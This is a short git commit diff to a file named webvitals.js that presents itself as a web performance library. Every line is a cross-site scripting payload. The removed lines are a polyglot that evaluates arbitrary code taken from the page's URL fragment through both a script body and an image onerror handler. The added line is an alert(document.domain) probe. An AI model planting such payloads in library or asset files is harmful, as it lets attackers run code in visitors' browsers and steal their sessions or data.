0f22f4cbbc1c2703e28ea44756cc3a3798556af9
plain-chip <44140274+plain-chip@users.noreply.github.com>
2022-07-22 14:45:24 -0600

    Update webvitals.js

--- html/js/lib/webvitals-js/webvitals.js
+++ html/js/lib/webvitals-js/webvitals.js
@@ -1,2 +1,1 @@
-<html><head></head><body>'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(1)}">
-msgbox+1</body></html>
+alert(document.domain)
